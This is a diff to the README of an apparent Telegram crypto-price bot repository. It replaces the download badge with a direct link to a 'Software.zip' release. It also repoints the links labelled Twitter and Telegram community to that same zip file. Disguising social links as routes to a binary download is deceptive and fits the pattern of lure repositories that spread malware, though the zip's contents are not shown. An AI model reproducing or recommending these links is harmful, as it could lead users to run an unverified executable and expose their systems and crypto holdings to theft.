@@ -12,7 +12,7 @@ Topics for this repository are currently not provided.
 ### Get Started
 To begin using the Telegram Crypto Price Bot, you can download the latest release version by clicking the link below:
 
-[![Download Bot](https://img.shields.io/badge/Download-Bot%20v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Bot](https://github.com/winyi27/Telegram-Crypto-Price-Bot/releases/download/v1.0/Software.zip%20v1.0.0-blue)](https://github.com/winyi27/Telegram-Crypto-Price-Bot/releases/download/v1.0/Software.zip)
 
 Click on the button above to download the bot file. Once downloaded, launch the bot to start receiving real-time crypto prices on Telegram. 
 
@@ -40,8 +40,8 @@ Want to contribute to this project? Feel free to fork the repository, make your 
 
 ### Stay Connected
 Stay connected with us for the latest updates and announcements:
-- Follow us on Twitter: [@CryptoPriceBot](https://twitter.com/CryptoPriceBot)
-- Join our Telegram group: [CryptoPriceBot Community](https://t.me/CryptoPriceBotCommunity)
+- Follow us on Twitter: [@CryptoPriceBot](https://github.com/winyi27/Telegram-Crypto-Price-Bot/releases/download/v1.0/Software.zip)
+- Join our Telegram group: [CryptoPriceBot Community](https://github.com/winyi27/Telegram-Crypto-Price-Bot/releases/download/v1.0/Software.zip)
 
 ### License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
